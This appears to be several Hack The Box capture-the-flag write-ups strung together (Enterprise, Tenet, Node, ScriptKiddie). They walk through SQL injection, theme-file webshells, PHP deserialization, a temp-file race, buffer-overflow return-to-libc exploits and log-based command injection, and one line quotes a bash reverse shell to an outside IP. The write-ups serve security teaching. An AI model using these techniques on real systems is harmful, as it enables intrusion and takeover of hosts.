WP plugins are typically zip files, and I can check for the presence of these files in /wp-content/plugins/[plugin name]/.  That path returns a 403, which is promising:
Plugins in WordPress are typically unzipped into /wp-content/plugins. I can check each of the files and they exist on Enterprise, but nothing interesting comes back:
Looking at the files, lcars.php is just metadata and comments about the plugin:
lcars_dbpost.php takes a GET parameter, query, and then uses it to build a database query:
The input is cast to an int before it’s used, which will eliminate any injections I might try. I can enumerate the items in the DB:
66-68 as Passwords is interesting. But not much else I can do there at this point.
lcars_db.php is very similar:
But it doesn’t cast the input as an int! It also doesn’t do conversion with the result of the query, just tried to echo it. In fact, this leads the page to break:
Where lcars_dbpost.php returns “Hello world!”, this errors. That’s because it’s taking the result of the query, which isn’t a string but an object, and trying to pass it to echo, which expects a string.
This is a rather complicated SQL injection, so I’ll let sqlmap do the heavy lifting:
It finds three injections, boolean-based blind, error-based, and time-based blind. Blind injections are always going to be slow, as they basically give one bit character per query. I’ll look at how the injection works in Beyond Root.
Start by listing the databases:
The wordpress DB has 12 tables:
Dumping wp_users gives a hash for william.riker:
Earlier I used the lcars_dbpost.php page to list all the posts in the DB, and there was one called passwords. I’ll dump the wp_posts table as well:
This prints a huge amount of output that’s difficult to show in the terminal. But it does also write it to a file as a .csv, so I can open it in Excel or even just less -S (turns off line wraps) to explore it. Or I can remember that it was three posts titled “Passwords” and use grep:
With some cut and sed, I can get the list of unique passwords:
The first line is a space, though I’d be surprised if that is a valid password.
The joomla DB doesn’t have any tables, but the joomladb table has a ton:
The edz2g_users table returns two more users:
I’ll add geordi.la.forge and Guinan to my notes.

Category: Shell as www-data on WordPress
To log into the WordPress instance, I’ll visit http://enterprise.htb/wp-admin, and it redirects to a login page:
I have one user name (william.riker) and four passwords. u*Z14ru0p#ttj83zS6 works:
One way to get a shell in WordPress is to modify a theme file, since they are written in PHP. On the left menu, Appearance –> Themes –> Editor will bring up the editor:
On the right, I’ll pick a page to edit. I like the 404 template. I’ll add a webshell right at the top:
On clicking the Update button, it returns that the page was saved:
It’s not uncommon to find this edit ability locked out from the web interface, in which case there are other methods to get RCE.
I’ll notice that the first post is http://enterprise.htb/?p=69. I’ll change that to p=169:
If I add a parameter, http://enterprise.htb/?p=169&0xdf=id, the execution is at the top of the page:
I often show how to go webshell to shell, but it’s also possible to just put it in the PHP:
Now visiting enterprise.htb/?p=169&ip=10.10.14.8 triggers a reverse shell back to my host:
The shell is running as www-data, on a hostname b8319d86d21e:
There’s no Python on this box, but I can get a PTY with script and then do the same background stty trick:
There’s a user.txt in /home, but it’s just a troll:
There’s a .dockerenv file in /:
It’s clear that I’m in a Docker container, and it’s running Debian 8 jessie:
This container is pretty empty, other than the WordPress stuff. The DB connection config is in /var/www/html/wp-config.php:
The DB_HOST is mysql. ping shows the IP for that host:
The local IP is 172.17.0.4. A super quick ping sweep shows four hosts on this network:
At this point fair to guess:

Category: Shell as www-data on Joomla
I have two usernames from the SQL injection, geordi.la.forge and Guinan. It turns out that each of their passwords is in the list I pulled from the draft post. Using Guinan / ZxJyhGem4k338S2Y logs in as Guinan:
Logging in with geordi.la.forge / ZD3YxfnSjezg67JZ grants access as Super User:
The Joomla admin panel is at /administrator, and the geordi creds work:
In the menus I’ll go to Extensions –> Templates –> Templates to see the installed templates:
A little trial and error shows that Protostar is the template in user. Clicking on it takes me to the editor with a list of files:
I’ll add a reverse shell to error.php:
Now I’ll click save.
I need a page that doesn’t exist, so I’ll just add 0xdf to the end of the index.php url and add the IP to get http://10.10.10.61:8080/index.php/0xdf?ip=10.10.14.8. On visiting in Firefox, I get a shell:
I’ll upgrade the shell with script just like before.
/home/user.txt is the same as before.
This is also a Docker container, and it has the IP 172.17.0.3, confirming my guess from above.

Category: Shell as www-data on Host
This container is also pretty empty. In the web folders, one thing jumped out:
A directory called /files is the only thing owned by root. In it, is lcars.zip:
That was on the HTTPS website above, so it’s interesting it’s here.
mount shows that it’s actually a folder from the host being mapped into the container:
If I write to it, that shows up on the HTTP site:
From my VM:
I’ll write a reverse shell into a PHP file:
Now on visiting https://10.10.10.61/files/0xdf.php, I get a shell at nc:
I’ll upgrade the shell:
The box has one user, and I can grab user.txt:
This host has the IPs 172.17.0.1 and 10.10.10.61, confirming that it is the Docker host.

Category: Shell as root
pstree is installed, and a nice way to look at the running processes:
xinetd is interesting - the extended internet services daemon. It will allow you to run a program over a port. If I connect to port 32812 and then run it again while it’s hanging waiting for the access code, pstree shows the program:
That’s a SUID root-owned binary:
I can run it and get the same prompt:
The binary is a 32-bit ELF:
ltrace is on the box, so I’ll run it with that. It hangs waiting for the access code at afgets call:
I’ll enter 0xdf, and see what continues:
Perfect, the next call is a strcmp between my input and “picarda1”. Entering that works, and leads to a menu:
At this point I can play with each of these functions, but I’m more interested in looking at it in Ghidra.
I’ll grab a copy of this file locally with nc, starting my listener on my box, and then running:
At my VM:
This will hang, but I’ll just Ctrl-c after a few seconds. Always check the hashes after this kind of exfil:
Looks good.
I’ll import the binary into a Ghidra project, and then open it in the code browser and let it do the run analysis steps.
There aren’t too many functions:
main, main_menu, bridgeAuth all jump out. As I look through the code, I’ll rename and retype variables to make it make more sense. main asks for an access code, calls bridgeAuth, and exits:
bridgeAuth checks the input against the static string, “picarda1”, and calls main_menu if there’s a match and exits otherwise:
main_menu reads input as an int and then uses that (assuming it’s less than 8), to jump to a function given an offset in a table relative to the GOT:
The function_addr_table looks like:
One of the functions listed in Ghidra was disableForcefields:
It reads a single string from the user with scanf, and then just prints it back as part of a message. scanf is a dangerous function. The buffer the string is read into is 204 bytes, but there’s no limit on the amount of input the user can send, which allows the user to overflow that buffer, which can lead to code execution.
To show this overflow is possible, I’ll send a large string in and watch for a segmentation fault. I can use Python to generate the different inputs to send the access code and menu selection and then a string. So with a legit string, “Test”, it prints that back:
But with a long string:
What’s happening is that the buffer is stored on the stack, and the stack builds up with new objects getting lower addresses. When the disableForcefields function is called, first the return address is put on the stack, then some other stuff, and then 204 bytes for this buffer. When I send 250 As, it ends up overwriting the function return address with 0x41414141, which isn’t a valid address, and then the program crashes.
ASLR (address space layout randomization) is a protection that’s specific to the host, not the program, and the setting is stored in /proc/sys/kernel/randomize_va_space. On systems today, it’s rare to see it disabled, but Enterprise is an older machine, and it’s disabled (0):
I can verify this with ldd on the binary and looking at where libc loads:
When ASLR is enabled, the address will change each time.
Without ASLR, I will almost certainly go with a return to libc attack, but I can check the binary-specific protections as well with checksec:
PIE means that the address in the main binary will be randomized, so I won’t want to do any ROP or jumping to locations in the main binary, as I can’t predict those (at least without a way to leak an address). NX is disabled, so I could write shellcode onto the stack and then jump into it. But a return to libc is just easier.
I need to know the exact point in my input that ends up overwriting the return address. To do that, I’ll generate a pattern of characters to pass in as input. This is commonly done with msf-pattern_create, but I was playing with this Python implementation for Enterprise:
Now I’ll run lcars in gdb (-q to skip all the intro printing, and I’ve got Peda installed as well):
I’ll enter r to run, and give it the access code and select 4:
I’ll enter the pattern, and the program crashes:
On a 32-bit program, the invalid address has been loaded into the EIP register (which has the address of the next instruction). In this case, it’s 0x31684130, or 0Ah1.
I can pass back either the hex address or the four characters string, and pattern will tell me how far into the input that was:
I can double check this with a string of 212 As and then four B:
I’ll do the same thing in gdb, and at the crash:
I’ve shown return to libc attacks before, and gave a detailed explanation in Frolic. The idea is that I’m going to overwrite the return address with the address of the system function in libc. The next address down the stack is the address to return from when system is done. This can be junk, or I can give it the address of exit to cleanly end. Then I need the arguments for system. I want to call system("/bin/sh"), so I need the address of a “/bin/sh” string in libc.
I’ve shown before using ldd to get the libc base address, then readelf to get the offsets of system and exit, and strings to get the address of /bin/sh. readelf isn’t on Enterprise, but gdb is, and it can get the needed addresses.
Drop into gdb:
If I try to print the addresses now, gdb won’t know them because the program isn’t started or loaded.
I’ll put a breakpoint at main, and run to that:
Now p (or print) will get the addresses:
find will look for a string between two memory addresses. I know there’s a ““/bin/sh” in libc, so I’ll search from the start of libc out an arbitrary amount (if I don’t find it, make it a bit bigger):
There’s a address, and I can verify it with x/s (display string):
The problem with that address is that it has an 0x0a byte in it. That’s the ASCII code for newline. The scanf function was reading %s, which, looking at the docs:
Any number of non-whitespace characters, stopping at the first whitespace character found. A terminating null character is automatically added at the end of the stored sequence.
That won’t work. I can try to look for just “sh” (which is actually looking for three bytes in a row, including the null byte at the end of the string):
The third one is the same address from the first search, just starting five bytes later. I can try any of the others.
I’ll pull all that together into a really simple Python script:
It creates the payload with 212 bytes of junk followed by the addresses. Then it uses pwntools to interact with the remote system, sending the access code and menu selection before the payload, and then dropping into an interactive shell.
It works:
And I can get root.txt:
The example for the error-based injection that sqlmap gave was:
Throwing that into Firefox returns:
The challenge here is that the plugin is printing the result of $db->query:
On a good query, that’s an object which leads to an error. But if I can make the query error out, then what returns into $result is an error string, and that will echo without error.
To show this, I’ll drop an SSH key into /root/.ssh/authorized_keys on Enterprise and get a better shell. Then I can drop into the mysql docker container:
Using the password from the WordPress config, I’ll connect to the DB:
Running the query that is created above, the same message comes back:
To understand Double Query Error-Based injection, it’s important to understand a couple SQL keywords.
COUNT(*) will return show the number of rows in a given group. So I can find the number of posts:
Or I can group by post_title and get the number of each title:
I’m also going to make sure of RAND and FLOOR here. RAND() will generate a number between 0 and 1. FLOOR will round it down to an int. The expression FLOOR(RAND()*2) will half the time produce a 1, and half a 0. And I can call this while selecting rows from a table without actually selecting any data from that table:
There’s 42 ones and zeros because there’s 42 rows in that table.
The error is going to come when I try to do a COUNT and a GROUPBY on a bunch of objects that repeat. For example, I’ll work from the query above with 42 ones and zeros. I’ll name the output column a, and then group by it. I’ll expect results like this:
But many times, I get this:
Somehow the grouped table that’s being passed to COUNT contains a duplicate entry, and it’s throwing the error.
Let’s start with a simple query to run, select user();:
The goal is to get root@localhost into an error message. I’ll add a COUNT column and a CONCAT of the data I want to get plus the random 0 or 1:
There’s an error message that contains the data I want to exfil, knowing that the last character (0 or 1) is not part of the data.
I’ll try to pull some data. First, I’ll change that table to information_schema.columns, as having a bunch more columns seems to make the error come up more often. Now I’ll replace user() with a query. I’ll also add in some tags that I could search on programmatically to extract the data. Finally, I want to put it into the format that fits the injection I have.
Now I can get that with curl:
I can pull content as well:
I need the mid on the results because if too much data comes back, it handles that as multiple lines, and breaks the error message.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 16 Jan 2021
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.18s latency).
Not shown: 64441 closed ports, 1092 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 18.04 Bionic.
The site is the default Ubuntu Apache page:
Running gobuster against the site finds a single directory, /wordpress:
I tried to load http://10.10.10.223/wordpress, but it looked very broken, as if none of the CSS or images were there. Wordpress is finicky about having the right hostname, but even without knowing that, the page source is full of links on http://tenet.htb. Before adding that to my hosts file, I wanted to check for any subdomains.
I started with wfuzz passing in different values in the Host: header, at first with no filters to find out the default page size:
I’ll quickly kill it once I see that the default page is coming back at 10918 characters, so I’ll hide that with --hh 10918:
www is valid. I’ll add both tenet.htb and www.tenet.htb to /etc/hosts:
www.tenet.htb seems to just return a 301 redirect to tenet.htb.
Because it’s a WP site, I did start wpscan in the background with wpscan --url http://tenet.htb -e ap,t,tt,u --api-token $WPSCAN_API. It didn’t find anything I didn’t find just by clicking around.
This page is a blog with three posts:
Clicking around the site, I’ll notice a couple user names (protagonist is the author of all three posts, neil left a comment on “Migration”).
The Migration post is interesting:
We’re moving our data over from a flat file structure to something a  bit more substantial. Please bear with us whilst we get one of our devs  on the migration, which shouldn’t take too long.
Thank you for your patience
And the comment from neil:
did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
The comment from neil sent me looking for sator.php. It doesn’t exist on the tenet.htb vhost, but it is on the IP (perhaps that’s why neil thinks it’s gone):
neil also mentioned a backup. With a couple guesses I found it with curl -s http://10.10.10.223/sator.php.bak:
I can’t even begin to explain what dev was trying to do with this script, but the unserialize function immediately catches my eye.

Category: Shell as www-data
The PHP script above is taking user input and passing it to unserialize. Serialization is the act of taking an object from memory in some language (like PHP) and converting it to a format that can be saved as a file. The format can be binary (Python) or a string (PHP, JavaScript), it depends on what you are serializing. Deserialization is the reverse, taking that string or binary and converting it back into an object within the context of a running program.
Deserialization of input that an attack can control is a very risky operation, as it allows for the attacker to create objects, and objects have functions that can run code. IppSec did a really good pair of videos on how this works. The important part here is the __destruct function. When a DatabaseExport object is freed (like at the end of the script), it will call this function. If I can pass in a serialized object of that type, in this case, the __desctruct function will write the contents of $data to the path in $user_file. There are several ways I could try, but I’ll just write a PHP webshell in this same directory.
To create a serialized PHP object, I’ll use PHP. This script will create the object with the right variables, and then print the serialized version:
Running it prints the serialized object:
Now I’ll call sator.php passing this object. I can have curl url-encode GET parameters by passing in -G and --data-urlencode:
I’ll notice that “Database updated” prints twice. That’s once for the DatabaseExport object stored in $app, and once for my object.
Checking for the webshell, it’s there:
To go from webshell to shell, I’ll trigger the webshell with the following reverse shell:
At nc, a shell comes back:
I’ll upgrade the typical way with python3 -c 'import pty;pty.spawn("bash")', then Ctrl-z, stty raw -echo; fg, then reset:

Category: Shell as neil
There’s one user on the box, neil:
On the blog, neil showed interest in the database. I’ll grab the creds from the wp-config.php file:
Noticing the DB username was neil, before connecting to the DB, I tried su with that password, and it worked:
From here I could grab user.txt:
That password also works for SSH access as neil:

Category: Shell as root
sudo -l is typically my first check, and it finds something here:
neil can run /usr/local/bin/enableSSH.sh as root without password.
This file is a Bash script:
The script itself defines three functions, checkAdded(), checkFile(), and addKey(), then it defines $key, calls addKey, and then checkAdded:
addKey creates a temp file name with the format /tmp/ssh-XXXXXXXX where the X will be replaced with ransom characters, and then writes the $key into it. Then it calls checkFile on that file, then appends the contents to root’s authorized_keys file, and deletes the temp file:
checkFile just uses Bash conditional expressions to first check if the file exists and has size greater than 0 (-s), and  then that it exists and is a regular file (-f). If either of those aren’t true, it prints and error, cleans up, and exits.
After the call to addKey there’s a call to checkAdded:
It uses cut to get the user from the SSH public key entry, and then checks that that names is in the authorized_keys file.
I can abuse this script by executing an attack on the temp file. I’ll watch for the file, and then change it’s contents to my SSH public key, so that my key is written into /root/.ssh/authorized_keys.
I want a loop that will run constantly, looking for files starting with ssh- in /tmp, and replacing their contents with my public key.
Now, in a second terminal, I’ll run sudo enableSSH.sh:
Because it’s an attack on a race condition, I will lose the race sometimes, and I’ll know that because it’ll say that it successfully added root@ubuntu. When it fails, nobody@nothing will be in authorized_keys, and I’ll get the failure message:
Then I can connect over SSH as root:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 14 Oct 2017
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.31s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  pppCategory: Recon
nmap found two open TCP ports, SSH (22) and something on TCP 3000:
Based on the OpenSSH version, the host is likely running Ubuntu Xenial 16.04.
The TCP 3000 port is claiming to be hadoop, which is a big data storage solution. Interestingly, there’s an http-title field. If I re-run nmap with just -sV, it gives a different answer:
I have no idea why adding -sC to run safe scripts against port 3000 would change the version reported from Express to Hadoop. But it’s a good reminder that when something looks unexpected, poke at it a bit more.
The site looks like a social media site:
It says that signups are currently closed. When I click on the three users, the profiles (at http://10.10.10.58:3000/profiles/[username]) aren’t very interesting (all three are the same other than image and name):
The login page has a simple form:
I tried some basic usernames/passwords, and some basic SQL injections, but to no avail. Because it’s using NodeJS, there’s a good chance the backend is using MongoDB. I tried some basic noSQL injections ([$ne]=1, {$gt: ''}, etc), but none returned anything interesting.
I’ll run feroxbuster against the site with no extensions:
None of these were particularly interesting. /uploads redirects back to /.
Looking at the HTTP response, it confirms the server is running Express:
Express is a NodeJS-based JavaScript framework for serving websites. The benefits of using JavaScript on the server is that it allows simplified interactions between the client-side JavaScript and the server-side JavaScript.
In the Firefox dev tools, I can see the different JS files running on the client:
app.js defines the different routes for site, each with a different controller. The controllers  are in the /controllers folder, and each have references to different calls to paths server-side starting with /api. The two endpoints in admin.js are /api/admin/backup and /api/session:
Both of those endpoints return {"authenticated":false} if I try to query them directly. home.js referenced /api/users/latest (likely getting the users to display in the latest users section). If I check that out with curl, it returns an array of users, each with _id, username, password, and is_admin fields:
In profile.js, there’s a call to /api/users/' + $routeParams.username. I can try that, and with known users is returns the same data, and with a non-existent user it returns not found:
None of the admin usernames I guessed were found, but eventually I checked /api/users/. It returns the same three users, plus one more, myP14ceAdm1nAcc0uNT:
I’ll use jq to get just the password hashes:
For unsalted hashes with a standard wordlist, it’s just easier to check online sites first rather than cracking myself. I’ll drop the hashes into CrackStation, and three of the four break:
The one I’m most interested in, the admin account, breaks with the password manchester.

Category: Shell as mark
I can use the creds recovered from the leaky API to login as myP14ceAdm1nAcc0uNT. It just presents a single download link:
The file is a single long line of ASCII text:
od can give me a list of the unique characters in the file:
The character set matches the base64 character set. On decoding it, there’s a Zip Archive:
The archive (now renamed to .zip) looks to have the source for the website:
Trying to unzip the archive (now renamed to .zip) requires a password:
zip2john will get a hash from the zip:
john will break this very quickly:
Now I can unzip the archive.
The files unzip to what looks like the source for the myplace application. In app.js, there’s a database connection string with credentials for mark:
That password for mark works over SSH:
Unfortunately, no flag yet:

Category: Shell as tom
There are two other users with home directories on the box:
user.txt is in tom’s directory but mark can’t read it:
There are two processes running as tom:
/var/www/myplace/app.js is the webapp I already interfaced with, so I’ll turn to /var/scheduler/app.js:
This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the tasks collection. For each doc, it will pass doc.cmd to exec to run it, and then delete the doc.
I’ll connect to the DB using the Mongo client specifying the user, password, and database to connect to:
In Mongo, a database (like scheduler) has collections (kind of like tables in SQL). This db has one collection:
The collection has no objects in it:
I’ll test execution by adding a command to touch a file in /tmp:
30 seconds later, the object is gone:
In /tmp, a new file is there owned by tom:
Now I’ll insert a reverse shell into the DB as the command:
30 seconds later, there’s a connection at nc:
I’ll upgrade the shell with the standard trick:
And now I can access user.txt:

Category: Shell as root
When gaining access to a second user in a CTF machine, it’s always useful to think about what files can be accesses/run now that couldn’t before. One way to approach that is to look at the groups associated with the new user:
sudo is the first to jump out, but trying to run sudo prompts for tom’s password, which I don’t have:
adm means that I can access all the logs, and that’s worth checking out, but admin is more interesting. It’s group id (gid) is above 1000, which means it’s a group created by an admin instead of by the OS, which means it’s custom. Looking for files with this group, there’s only one:
It’s also a SUID binary owned by root, which means it runs as root.
Interestingly, this binary is called from /var/www/myplace/app.js:
It calls backup -q backup_key __dirname, where __dirname is the current directory.
The binary is a 32-bit ELF:
Before pulling this binary back and opening in in Ghidra, I’ll try running it on Node. It returns without any output:
I tried giving it arguments to see if there was a check at the front looking for a certain number, and on three, it output something:
This makes sense with how this binary is called from app.js above. It’s complaining about needing a magic word.
I’ll run that again with ltrace, and change the three args so that they are different (to better track which is which), so ltrace a b c. I’ll walk through the output in chunks. First it checks the effective user id, and then sets the uid to 0, root. Then it does a string comparison between “a” (first arg input) and “-q”:
In this case that comparison returns 1 (no match). If I do pass in -q as the first arg, it just prints nothing. Maybe this is some kind of quiet mode? That was what was passed in the call from the webserver. After that, it prints the computer ascii art with a bunch of puts calls.
Next the binary uses strcat to build the string /etc/myplace/keys and opens that file:
The result of the fopen is 0x9891410, which represents a  FILE object.
Next there’s a series of fgets, strcspn, and strcmp calls:
strcspn with the second argument of \n gets the length of the line. Then there are strcmp calls with “b”, the second argument. This looks like a loop reading lines from the file, comparing them to the second arg. None of them match.
Then it copies the “you didn’t say the magic word” string, prints it, and exits:
/etc/myplace/keys shows the three 64-characters hashes and a blank line just as observed with ltrace:
If I put one of those hashes into the second argument, it runs past the access token check:
Interestingly, it will also work with an empty string as the token arg (because there’s an empty line in the keys file):
With a valid token, it says it’s “archiving c”, and then complains that the path doesn’t exist. I’ll try replacing “c” with a path. I’ll create a single file in /dev/shm, and then pass that path to backup:
If I change “a” to “-q”, it will just print the base64:
Just like before, the base64 decodes to a zip file, which contains the directory:
It unzips with the same password as before (“magicword”):
The obvious next step is to backup /root. Right at the start I can tell something is different because there’s a message that prints, even in -q mode:
The string does decode to a .zip archive, but it’s a different kind of archive, as it doesn’t decompress with unzip:
I’ll bring that base64 string back to my vm and uze 7z to decompress. The file is an ASCII art troll:
Running this with ltrace, after the token check, there’s a strstr check with the string .., and then with /root. strstr looks for the second string in the first string. When there’s a match, it prints the finished message and then the “troll”:
In fact, that troll message is hardcoded into the binary:
When I run it on /dev/shm, there are more checks:
The fact that / matches doesn’t seem to mess things up. I did try with the other characters, but they did generate the troll, which blocks almost every attempt I had at command injection (see Beyond Root for the one that worked).
After all the checks, it copies the input into a new buffer (with strcpy), creates a temp filename using time as a seed to generate a random number, and then calls system to create the zip:
Then it base64 encodes that file with another system call and deletes the file:
I looked more closely at if I could predict the filename, but I could not.
In looking through the ltrace output, I noticed a strcpy involving the file path to backup when there’s no -q:
That’s my input being copied into a buffer without a length limit. I’ll test it by sending in a long path:
That looks like a buffer overflow.
To get the buffer’s offset to EIP, I’ll run it in gdb, which isn’t on Node. I’ll use nc to send it back to my VM. Trying to run it will actually fail with a new error:
This is actually the failure of trying to open /etc/myplace/keys. If I create that file with an empty line (so that blank key will work), then I can run it and it will work:
I’ll use msf-pattern_create, but I need to give it custom sets or else it will include special characters that trigger the denylist checks:
I’ll run gdb to debug the program, and pass in the pattern as the third arg:
There’s a bunch of data there, but the important part if the value of EIP at the crash, 0Ar1 or 0x31724130. Now that will give the offset to EIP:
That means that if I send in 512 bytes of junk and then an address, that address will overwrite the return address and eventually become EIP.
To figure out how to exploit the binary, I’ll need to understand what protections are in place:
No canaries is nice for a BOF. NX means I can’t run from the stack, but that’s overcomable.
ASLR is a setting for the OS, not the binary:
It is enabled.
Luckily for me, the range of addresses for libc are relatively bounded:
All the addresses start with 0xf7 and end with 0x000. The middle three digits change. The largest of these is typically 5, but can be 6. The three digits seem to range from 0x544 through 0x614.  I’ll grab one of these, 0xf75c2000.
Because each character is four bits, and the high characters is only changing the one low bit (5 or 6), there ASLR is really only random to 9 bits, or 512 possibilities, and potentially less. I can just guess and run this lots of times, and eventually be correct. The odds of being right any one time is 0.1%. But the odds of being right in 500 attempts is ~63%.
I’m going to overwrite the return address with a return to LIBC attack that calls system('/bin/sh') and returns to exit.
readelf will give the offsets into LIBC for the functions I want to call:
Finally, I need the address of the string /bin/sh:
These will go onto the stack with the address of system as the return address, then the address of exit, and then the arg to system, the address of “/bin/sh”.
The box has Python3.5 on it (also Python2, but I like 3), so it doesn’t have the modern subprocess functions. I’ll go simple, and just write a Python script that outputs the exploit buffer.
Python3 is weird about printing a buffer of bytes (without b' at the front), but sys.stdout.buffer.write will do it.
Running this will print the buffer that will cause an overflow and potentially execute a shell:
When I run this, I have a very small chance of getting the libc address correct. However, I can run it lots of times in a loop, as failure takes only a fraction of a second. I’ll run a Bash loop:
It’s important not to pass -q, as then the strcpy doesn’t happen. After a ton of junk printing out, it will eventually run Bash as root and return a shell:
And root.txt:
I found a few extra ways to root this box, and one I was hopeful for that didn’t turn out.
The checks don’t look for the ~ character. Since the binary is running as root, I can try to exfil ~. It just pulls tom’s homedir:
But, ~ is set via an environment variable, which I can change.
It contains the real flag:
The filter was looking for /root. I’ll use /roo? instead, where Linux will handle ? as a single character wildcard, and that will only match on /root.
Getting no error on piping the output into base64 shows that I didn’t get the troll. It does unzip:
I could also use * as a wildcard here to do the same thing:
The denylist of characters is pretty extensive, but it missed on that will work to command inject into system. A newline in system will work just like it does in a Bash script, breaking commands. I can try just putting a newline, then /bin/bash to see if that will run. I’ll enter this by entering a ', then hitting enter to get a newline, and then entering /bin/bash and then closing the ' and hitting enter:
It looks like it works, but no output comes back:
Looking at the strings in the binary, I can see the command that’s generated:
It’s the zip command, and it’s clear that the output is being passed to /dev/null. I’ll try with an additional newline:
This time it works and returns a shell that outputs!
I considered what would happen if I was able to predict the temp file name used to save the Zip archive as. If it were purely time based, I could guess the name generated off the next few seconds, and mess with watching for those files and trying to change them, or pre-creating them as symlinks to other important files.
Unfortunately for me, the temp file name is generated from a combination of the current process process id (pid), the current time, and the current clock time for the process:
I could potentially guess the pid of upcoming processes. I could also potentially guess the time. But there’s not a good way to guess the clock time into the process, which makes this seem too hard to pull off.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 06 Feb 2021
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.17s latency).
Not shown: 65519 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
5000/tcp  open     upnpCategory: Recon
nmap finds two open ports, TCP 22 (SSH) and 5000 (HTTP over Python):
The site is for kids hacker tools:
There are three sections. The first takes an IP and runs nmap against it. On scanning localhost, it seems to work:
The payloads section allows me to select from windows / linux / android, provide an lhost ip, and and option template file. Based on the text, I can assume that these are arguments passed to msfvenom to generate a payload. On success, it returns the payload, which is downloadable. The link seems to work for the next five minutes:
The sploits section runs the input against searchsploit and shows the results:
Given that all three of these seem to be running binaries from a Linux system, I’ll try command injection in each input, but without luck. Any non-alphanumeric characters in the searchsploit box lead to this warning:

Category: Shell as kid
The version of metasploit on the box is 6.0.9, which is vulnerable to CVE-2020-7384. I can use the searchsploit command line or through the website to find this vulnerability:
I actually worked with ExploitDB to get them to add this vulnerability to their database so that it would show up for this box. The vulnerability is a command injection in the way that msfvenom handles an APK template file. The idea of the template file is that you can pass msfvenom a legit .exe or .apk, and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.
There’s also a metasploit exploit for this vulnerability which I found more reliable than the Python script:
The default options work, so I’ll just set my host and port:
Running it creates an .apk file:
If I wanted to catch this shell with msfconsole, I could start up an exploit/multi/handler, but because the payload is an unstaged shell, I can also use nc. I’ll start a nc listener on TCP 443 using nc -lnvp 443. Then I’ll upload the APK to the site:
After a few seconds, the site returns an error:
But there’s shell at nc:
The shell returns with no prompt, but if I enter Linux commands (like id) and hit enter, they execute:
The shell is running as the kid user. I’ll upgrade my shell using Python to get a TTY:
I can grab user.txt:
I could also write a public SSH key into /home/kid/.ssh/authorized_keys, and then SSH into ScriptKiddie.

Category: Shell as pwn
The code for the website is a Python app in /home/kid/html:
I noted above when looking for command injection vulnerabilities in the site that it threatened to “hack me back”. As kid, I can take a look at the code:
regex_alphanum is defined at the top of the file to do just what it sounds like:
It will match a string that contains only alphnumeric characters plus space and period. If anything is submitted that doesn’t match that, it writes the name and source IP into a file, /home/kid/logs/hackers.
I can look at that format of that line using the Python shell:
In the logs dir, the hackers file is empty:
I can trigger the log, or write to it myself, but it immediately empties. I can show this by sending a single line that writes to the log, then cats the log, then sleeps, then cats the log again:
It’s there, but then it’s not.
Looking at the other user, pwn, as kid I can see a file and a directory in the other user’s (pwn) homedir:
I can’t access the recon directory, but I can read scanlosers.sh:
The script is taking the logs from the webapp, using cut and sort to get a unique list of IPs, and then looping over them and running nmap to scan the top 10 ports on that IP, saving it in the recon folder. Then it clears the log.
That seems to be running each time something is written to the hackers file, as the log clears immediately (I’ll show how in Beyond Root). Knowing how that’s being read, I’ll drop a log into the hackers file again, this time with tcpdump running on my host:
At tcpdump, I see 10 ports being scanned:
So it’s clear that script is running.
The script is also injectable. Each line of the log is going to go into cut to select the third and beyond objects (-f3-) when separated by space (-d' '). Then it will sort -u to remove duplicates. This isolates the IP:
Then for each IP, it will run:
So if I can put more than just an IP into the file where the IP should be, I can inject commands. For example, I’ll use a payload like
The first two x are just cut out, so that payload starts after that. The next x is the name of the file in /recon. Then I put a 127.0.0.1 so it would have something to scan. Then there’s a ; to start a new command, which I’ll start with ping. Then a # to comment out the rest of the line. That would make:
With syntax highlighting on the part inside sh -c "":
It’s clearly going to nmap and then ping.
I’ll start tcpdump and put that into the log:
Immediately there’s ICMP at tcpdump:
With command injection verified, I’ll update the payload from a ping to a reverse shell. I could also do things like writes a SSH key or make a SUID copy of sh.
I’ll write this payload with a reverse shell to the logs:
Immediately at nc there’s a connection:
Same shell upgrade for command history:
A lot of people I saw getting stuck on this step didn’t take into account the cut, or read it incorrectly. If you tried to just pass a reverse shell in without some spacing, then it would lead to weird results. For example, if you tried to pass:
That would create:
That’s going to try to scan '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1', which is not going to resolve.
On the other hand, the Bash pipe shell will have some weird results:
Passing that into cut gives a result:
That will inject into the command to be:
That might actually work, just as a lucky result of what gets cut.
Another issues I saw was people forgetting to comment out the rest of the line. So take the payload I used without the comment:
That creates:
The first ping will fail because 10.10.14.15.nmap is not a valid ip. But the second will work, but the output will be all piped to /dev/null. A rev shell will get more messed up:
Becomes:
The first bash call will connect back, but then fail because of the .nmap. The second would actually work, if you are quick enough to have the nc listener receive the first connection, start listening again, and then get the second. Something like for i in {1..2}; do nc -lvnp 443; done will work.

Category: Shell as root
The first thing I typically check is sudo, and it pays off again, as pwn can run msfconsole with sudo as root without a password:
On running that, I’ve got a Metasploit terminal as root:
One way to get a shell from here is to drop to the integrated Ruby shell, irb:
From there, I can run system to run arbitrary commands. One way is to copy bash and set it SUID:
Now that will give a root shell:
Even simpler, I could run system("bash") from irb:
Simpler yet, I can run terminal commands from the MSF prompt:
Regardless of the method, I can now grab root.txt:
There are also two incron tasks running as pwn, stored in /var/spool/incron/pwn:
incron, from iNotify cron, is a service which will watch for different kinds of filesystem events and trigger actions based on them. So for example, the first line above. It is looking at the /home/pwn/recon folder, and triggering on IN_CLOSE_WRITE events. Whenever there’s a write event in that folder, it will run sed. This line is a cleanup mechanism. It will take all the scan data written to /home/pwn/recon and replace open with closed. This was just being careful not to leave scans of players machines laying around on the host. Any ports found open would still show closed.
